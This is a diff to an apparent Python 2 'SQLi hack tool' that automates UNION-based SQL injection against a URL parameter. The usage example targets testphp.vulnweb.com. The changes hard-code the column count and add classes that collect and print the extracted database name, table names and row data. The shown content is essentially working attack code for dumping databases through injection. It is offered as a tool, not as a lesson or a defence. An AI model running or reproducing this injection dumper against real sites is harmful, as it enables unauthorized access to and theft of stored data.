@@ -18,7 +18,7 @@ ____ _              ___      _                     _____
 
 More: https://www.facebook.com/TheCybersTeam
 Usage: python sqli.py --url http://testphp.vulnweb.com/listproducts.php?cat=1
-Fast and easy SQLi hack tool Beta 1.3
+Fast and easy SQLi hack tool Beta 1.5
 """
 print header
 
@@ -70,7 +70,7 @@ def countColumns(url):
     return 0
 
 try:
-    columns = countColumns(url)
+    columns = 11 #countColumns(url)
 except:
     pass
 
@@ -128,9 +128,22 @@ def getDatabase(vulCol,columns,url):
     res = getContent(url)
     return getVars(res)
 
-database = getDatabase(vulCol,columns,url)
-print "Database: "+database
+class Db:
+    name = None
+    tables = []
+    def setName(self, name):
+        self.name = name
+    def setTables(self, table):
+        self.tables = table
 
+dbs = []
+db = Db()
+database = getDatabase(vulCol,columns,url)
+db.setName(database)
+dbs.append(db)
+
+for i in dbs:
+    print "Database: " + i.name
 
 def getTables(database,vulCol,columns, url):
     global build
@@ -138,7 +151,20 @@ def getTables(database,vulCol,columns, url):
     res = getContent(url)
     return getVars(res)
 
+
+class Tb:
+    name = None
+    def setName(self,name):
+        self.name = name
+
+tbs = []
 tables = getTables(database,vulCol,columns, url)
+for i in tables.split(","):
+    tb = Tb()
+    tb.setName(i)
+    tbs.append(tb)
+
+dbs[0].setTables(tbs)
 print "Tables: "+tables
 
 sys.stdout.write("\nTable: ")
@@ -163,26 +189,34 @@ def getData(cols, table,database, volCol, columns, url):
     line = ""
     i = 0
     title = ""
+    space = []
 
     for name in cols:
+        space.append(len(name))
         title+=name+"\t"
         if i !=0:
             line+=",0x3a,"
         line+=name
         i = i + 1
 
-    print title
     url = build[0] + "concat(0x27,0x23,group_concat("+line+"),0x23,0x27)" + build[1]+ " from+"+table
     res = getContent(url)
     data = getVars(res)
     rows = data.split(",")
     
     for j in rows:
-        line = ""
+        i = 0
         col = j.split(":")
+        
         for k in col:
-            line+=k+"\t"
-        print "\n\n"+line
-
+            if len(k) > space[i]:
+                space[i] = len(k)
+            i = i + 1
+        
+        line = ""
+        i = 0
+        for k in col:
+            line+=k
+        print line
 getData(cols,table,database,vulCol,columns, url)
 #print "Data: "+data
